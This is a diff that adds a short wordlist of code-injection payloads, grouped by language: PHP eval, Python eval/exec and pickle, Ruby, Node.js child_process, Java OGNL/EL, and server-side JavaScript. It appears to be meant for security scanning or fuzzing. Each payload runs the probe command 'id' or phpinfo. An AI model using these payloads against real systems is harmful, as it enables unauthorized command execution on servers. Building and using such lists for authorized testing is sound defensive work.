@@ -1,0 +1,34 @@
+# === PHP eval/preg_replace /e ===
+;system('id');//
+;phpinfo();//
+'.system('id').'
+${@phpinfo()}
+${system('id')}
+
+# === Python eval/exec ===
+__import__('os').system('id')
+__import__('os').popen('id').read()
+().__class__.__bases__[0].__subclasses__()
+exec("import os; os.system('id')")
+
+# === Python pickle (insecure deserialization marker) ===
+cos\nsystem\n(S'id'\ntR.
+
+# === Ruby eval ===
+`id`
+system('id')
+%x(id)
+eval('`id`')
+
+# === Node.js eval / new Function ===
+require('child_process').execSync('id').toString()
+process.mainModule.require('child_process').execSync('id')
+this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id")
+
+# === Java OGNL / EL injection ===
+${@java.lang.Runtime@getRuntime().exec("id")}
+%{(#cmd='id').(#p=new java.lang.ProcessBuilder({'sh','-c',#cmd}))}
+
+# === Server-side JavaScript (eval reflected) ===
+;process.exit()
+);process.mainModule.require('child_process').execSync('id');//
